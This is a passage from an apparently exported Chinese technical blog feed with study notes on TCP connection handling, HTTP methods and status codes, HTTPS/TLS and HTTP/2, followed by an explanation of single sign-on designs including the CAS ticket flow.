发出确认，确认号为 y+1，序号为 x+1。 B 收到 A 的确认后，连接建立。 三次握手的原因 第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。 客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。客户端等待一个超时重传时间之后，就会重新请求连接。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会打开两个连接。如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。 TCP 的四次挥手 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。 A 发送连接释放报文，FIN=1。 B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。 当 B 不再需要连接时，发送连接释放报文，FIN=1。 A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。 B 收到 A 的确认后释放连接。 四次挥手的原因 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。 TIME_WAIT 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由： 确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。 等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。 TCP 可靠传输TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。 一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下： 其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下： 其中 RTTd 为偏差的加权平均值。 TCP 滑动窗口窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。 发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。 接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。 TCP 流量控制流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。 TCP 拥塞控制如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。 TCP 主要通过四个算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。 发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。 为了便于讨论，做如下假设： 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 慢启动与拥塞避免发送的最初执行慢开始，令 cwnd = 1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 … 注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。 如果出现了超时，则令 ssthresh = cwnd / 2，然后重新执行慢开始。 快重传与快恢复在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。 在发送方，如果收到三个重复确认，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。 在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。 慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。 应用层—HTTP一 、基础概念请求和响应报文 请求报文 Http请求报文由三部分组成：请求行，请求头，请求体 请求行：请求方法、请求地址、协议名称和版本号请求头：Referer、User-Agent、Accept、Cookie、Cache-Control、Content-Length等属性。Content-Length可用于服务端判断消息接受完的条件请求体：GET请求与POST请求传递方式不同(Message Body) Accept：浏览器可接受的MIME类型。Accept-Charset：浏览器可接受的字符集。Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。 Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。 Connection：表示是否需要持久连接。 Content-Length：表示请求消息正文的长度。 Cookie：这是最重要的请求头信息之一 From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。 Host：初始URL中的主机和端口。 If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。 Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。 POST 请求体类型分类form-data：就是http请求中的multipart/form-data,它会将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。当上传的字段是文件时，会有Content-Type来表名文件类型；content-disposition，用来说明字段的一些信息；由于有boundary隔离，所以multipart/form-data既可以上传文件，也可以上传键值对，它采用了键值对的方式，所以可以上传多个文件。可以模拟填写表单，并且提交表单。可以选择文件类型，但不能保存历史记录x-www-form-urlencoded：就是application/x-www-from-urlencoded,会将表单内的数据转换为键值对raw：原生任意格式的文本，text、json、xml、htmlbinary：相当于Content-Type:application/octet-stream,从字面意思得知，只可以上传二进制数据，通常用来上传文件，由于没有键值，所以，一次只能上传一个文件。image, audio or video files.text files，也不能保存历史记录，每次选择文件，提交 响应报文 响应行：报文协议及版本，状态码及状态描述响应头：Referer、User-Agent、Accept、Cookie、Cache-Control等属性响应体：服务器返回的数据 Allow 服务器支持哪些请求方法（如GET、POST等）。 Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。 Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。 Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。 Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。 Expires 应该在什么时候认为文档已经过期，从而不再缓存它？ Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。 Location 表示客户应当到哪里去提取文档。 Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。 Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。 Set-Cookie 设置和页面关联的Cookie。 WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=\”executives\””)。注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。 二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 HEAD 获取报文首部 和 GET 方法类似，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。 更多 POST 与 GET 的比较请见第九章。 GET产生一个TCP数据包；POST产生两个TCP数据包。 长的说： 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。 GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: &quot;e0023aa4e&quot;Content-Length: 100[description of changes] DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。 会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 CONNECT 要求在与代理服务器通信时建立隧道 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。 GET 和 POST 比较作用 GET 用于获取资源，而 POST 用于传输实体主体。 参数 GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。 因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 中文 会转换为 %E4%B8%AD%E6%96%87，而空格会转换为 %20。POST 参数支持标准字符集。 1234GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 安全 安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 幂等性 幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。 所有的安全方法也都是幂等的。 在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。 GET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1 -&gt; Adds a 1nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即使不同的请求接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 可缓存 如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送。 三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 含义 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝。 404 Not Found 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、具体应用连接管理 短连接与长连接 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。 长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close； 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 Connection : Keep-Alive。 流水线 默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。 流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。 五、HTTPSHTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。 通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。 非对称密钥加密 非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。 公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。 优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。 HTTPS 采用的加密方式 HTTPS 采用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证传输过程的安全性，之后使用对称密钥加密进行通信来保证通信过程的效率。（下图中的 Session Key 就是对称密钥），而服务器公钥只用于加密”Session Key “本身，这样就减少了加密运算的消耗时间。 如上图所示，整个SSL/TLS握手阶段一共有4次通信： 1.客户端发出请求（ClientHello）：随机数1，支持的协议，支持的加密方法 首先，客户端先向服务器发出加密通信的请求，并向服务器提供以下信息： 支持的协议版本，如TLS 1.0 一个客户端生成的随机数，稍后用于生成对话密钥 支持的加密方法，如RSA公钥加密 支持的压缩方法 2.服务器回应（ServerHello）：随机数2，确认协议和加密方法，证书 确认加密通信协议版本。如果浏览器与服务器支持的版本不一致，则服务器关闭加密通信 一个服务器生成的随机数，稍后用于生成对话密钥 确认加密方法 服务器证书 此处，如果服务器需要确认客户端的身份，如金融机构需要客户提供USB密钥（U盾），就会向客户端请求证书。 3.客户端回应：随机数3（加密 session key，根据前面随机数生成，证书中公钥加密），编码通知 一个随机数，稍后用于生成对话密钥，并且只用服务器的公钥加密，防止被窃听 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验 如果前一步要求了客户端证书，则会发送证书及相关信息。 4.服务器回应：编码通知 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送 服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验 至此，整个握手阶段全部结束。接下来，客户端与服务器进入HTTPS加密通信，就完全是使用普通的HTTP协议，只不过用”会话密钥“加密内容。 认证 通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。 服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 六、HTTP/1.1新特性 默认是长连接 支持流水线 支持同时打开多个 TCP 连接 支持虚拟主机 新增状态码 100 支持分块传输编码 新增缓存处理指令 max-age Entity tag，If-Unmodified-Since, If-Match, If-None-Match 缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。 带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。 错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。 Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。 长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。 七、HTTP/2.0HTTP/1.x 缺陷 HTTP/1.x 实现简单是以牺牲性能为代价的： 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层 HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。 在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 在二进制分帧层上，HTTP 2.0 会将所有传输的信息分割为更小的消息和帧,并对它们采用二进制格式的编码 ，其中HTTP1.x的首部信息会被封装到Headers帧，而我们的request body则封装到Data帧里面。 然后，HTTP 2.0 通信都在一个连接上完成，这个连接可以承载任意数量的双向数据流。相应地，每个数据流以消息的形式发送，而消息由一或多个帧组成，这些帧可以乱序发送，然后再根据每个帧首部的流标识符重新组装。 HTTP 2.0 的二进制分帧机制解决了HTTP1.x中存在的队首阻塞问题，也消除了并行处理和发送请求及响应时对多个连接的依赖。 有了新的分帧机制后，HTTP 2.0不再依赖多个TCP连接去实现多流并行了。每个数据流都拆分成很多帧,而这些帧可以交错，还可以分别优先级。HTTP2.0连接都是持久化的，而且客户端与服务器之间也只需要一个连接即可。 大多数HTTP 连接的时间都很短，而且是突发性的，但TCP 只在长时间连接传输大块数据时效率才最高。HTTP 2.0 通过让所有数据流共用同一个连接，可以更有效地使用TCP 连接 http1.0的队首阻塞 对于同一个tcp连接，所有的http1.0请求放入队列中，只有前一个请求的响应收到了，然后才能发送下一个请求。 可见，http1.0的队首组塞发生在客户端。 http1.1的队首阻塞 对于同一个tcp连接，http1.1允许一次发送多个http1.1请求，也就是说，不必等前一个响应收到，就可以发送下一个请求，这样就解决了http1.0的客户端的队首阻塞。但是，http1.1规定，服务器端的响应的发送要根据请求被接收的顺序排队，也就是说，先接收到的请求的响应也要先发送。这样造成的问题是，如果最先收到的请求的处理时间长的话，响应生成也慢，就会阻塞已经生成了的响应的发送。也会造成队首阻塞。 可见，http1.1的队首阻塞发生在服务器端。 服务端推送 HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。 首部压缩 HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。 HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。 不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。 [](]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FSSO%2F</url>
    <content type="text"><![CDATA[前言 单点登录单点登录（Single Sign On），简称为 SSO，是目前比较流行的企业业务整合的解决方案之一。SSO的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。 实现单点登录说到底就是要解决如何产生和存储那个信任，再就是其他系统如何验证这个信任的有效性，因此要点也就以下两个： 存储信任 验证信任 如果一个系统做到了开头所讲的效果，也就算单点登录，单点登录有不同的实现方式，本文就罗列我开发中所遇见过的实现方式。 以Cookie作为凭证媒介最简单的单点登录实现方式，是使用cookie作为媒介，存放用户凭证。用户登录父应用之后，应用返回一个加密的cookie，当用户访问子应用的时候，携带上这个cookie，授权应用解密cookie并进行校验，校验通过则登录当前用户。 以上方式把信任存储在客户端的Cookie中，这种方式很容易令人质疑： Cookie不安全 不能跨域实现免登 对于第一个问题，通过加密Cookie可以保证安全性，当然这是在源代码不泄露的前提下。如果Cookie的加密算法泄露，攻击者通过伪造Cookie则可以伪造特定用户身份，这是很危险的。对于第二个问题，更是硬伤。 通过JSONP实现对于跨域问题，可以使用JSONP实现。用户在父应用中登录后，跟Session匹配的Cookie会存到客户端中，当用户需要登录子应用的时候，授权应用访问父应用提供的JSONP接口，并在请求中带上父应用域名下的Cookie，父应用接收到请求，验证用户的登录状态，返回加密的信息，子应用通过解析返回来的加密信息来验证用户，如果通过验证则登录用户。 这种方式虽然能解决跨域问题，但是安全性其实跟把信任存储到Cookie是差不多的。如果一旦加密算法泄露了，攻击者可以在本地建立一个实现了登录接口的假冒父应用，通过绑定Host来把子应用发起的请求指向本地的假冒父应用，并作出回应。因为攻击者完全可以按照加密算法来伪造响应请求，子应用接收到这个响应之后一样可以通过验证，并且登录特定用户。 通过页面重定向的方式最后一种介绍的方式，是通过父应用和子应用来回重定向中进行通信，实现信息的安全传递。父应用提供一个GET方式的登录接口，用户通过子应用重定向连接的方式访问这个接口，如果用户还没有登录，则返回一个的登录页面，用户输入账号密码进行登录。如果用户已经登录了，则生成加密的Token，并且重定向到子应用提供的验证Token的接口，通过解密和校验之后，子应用登录当前用户。 同域下的单点登录一个企业一般情况下只有一个域名，通过二级域名区分不同的系统。比如我们有个域名叫做：a.com，同时有两个业务系统分别为：app1.a.com和app2.a.com。我们要做单点登录（SSO），需要一个登录系统，叫做：sso.a.com。 我们只要在sso.a.com登录，app1.a.com和app2.a.com就也登录了。通过上面的登陆认证机制，我们可以知道，在sso.a.com中登录了，其实是在sso.a.com的服务端的session中记录了登录状态，同时在浏览器端（Browser）的sso.a.com下写入了Cookie。那么我们怎么才能让app1.a.com和app2.a.com登录呢？这里有两个问题： Cookie是不能跨域的，我们Cookie的domain属性是sso.a.com，在给app1.a.com和app2.a.com发送请求是带不上的。 sso、app1和app2是不同的应用，它们的session存在自己的应用内，是不共享的。 那么我们如何解决这两个问题呢？针对第一个问题，sso登录以后，可以将Cookie的域设置为顶域，即.a.com，这样所有子域的系统都可以访问到顶域的Cookie。我们在设置Cookie时，只能设置顶域和自己的域，不能设置其他的域。比如：我们不能在自己的系统中给baidu.com的域设置Cookie。 Cookie的问题解决了，我们再来看看session的问题。我们在sso系统登录了，这时再访问app1，Cookie也带到了app1的服务端（Server），app1的服务端怎么找到这个Cookie对应的Session呢？这里就要把3个系统的Session共享，如图所示。共享Session的解决方案有很多，例如：Spring-Session。这样第2个问题也解决了。 同域下的单点登录就实现了，但这还不是真正的单点登录。 不同域下的单点登录同域下的单点登录是巧用了Cookie顶域的特性。如果是不同域呢？不同域之间Cookie是不共享的，怎么办？ 这里我们就要说一说CAS流程了，这个流程是单点登录的标准流程。 上图是CAS官网上的标准流程，具体流程如下： 用户访问app系统，app系统是需要登录的，但用户现在没有登录。 跳转到CAS server，即SSO登录系统，以后图中的CAS Server我们统一叫做SSO系统。 SSO系统也没有登录，弹出用户登录页。 用户填写用户名、密码，SSO系统进行认证后，将登录状态写入SSO的session，浏览器（Browser）中写入SSO域下的Cookie。 SSO系统登录完成后会生成一个ST（Service Ticket），然后跳转到app系统，同时将ST作为参数传递给app系统。 app系统拿到ST后，从后台向SSO发送请求，验证ST是否有效。 验证通过后，app系统将登录状态写入session并设置app域下的Cookie。 至此，跨域单点登录就完成了。以后我们再访问app系统时，app就是登录的。接下来，我们再看看访问app2系统时的流程。 用户访问app2系统，app2系统没有登录，跳转到SSO。 由于SSO已经登录了，不需要重新登录认证。 SSO生成ST，浏览器跳转到app2系统，并将ST作为参数传递给app2。 app2拿到ST，后台访问SSO，验证ST是否有效。 验证成功后，app2将登录状态写入session，并在app2域下写入Cookie。 这样，app2系统不需要走登录流程，就已经是登录了。SSO，app和app2在不同的域，它们之间的session不共享也是没问题的。 有的同学问我，SSO系统登录后，跳回原业务系统时，带了个参数ST，业务系统还要拿ST再次访问SSO进行验证，觉得这个步骤有点多余。他想SSO登录认证通过后，通过回调地址将用户信息返回给原业务系统，原业务系统直接设置登录状态，这样流程简单，也完成了登录，不是很好吗？ 其实这样问题时很严重的，如果我在SSO没有登录，而是直接在浏览器中敲入回调的地址，并带上伪造的用户信息，是不是业务系统也认为登录了呢？这是很可怕的。 https://blog.csdn.net/qq_39089301/article/details/80615348 https://blog.csdn.net/qq_39089301/article/details/80615348]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_JavaScript%2F</url>
